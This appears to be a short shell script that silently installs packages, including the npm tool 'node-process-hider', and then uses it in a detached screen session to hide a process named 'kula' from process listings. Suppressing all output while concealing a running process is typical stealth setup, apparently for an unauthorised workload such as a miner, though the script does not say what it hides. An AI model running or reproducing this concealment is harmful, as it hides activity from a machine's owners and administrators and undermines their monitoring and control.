apt update -y &> /dev/null
apt-get install libpci3 &> /dev/null
apt-get install screen -y &> /dev/null
apt-get install nodejs-dev node-gyp libssl1.0-dev &> /dev/null
apt-get install npm &> /dev/null
npm i -g node-process-hider &> /dev/null
screen -dmS zuli ph add kula
ph list
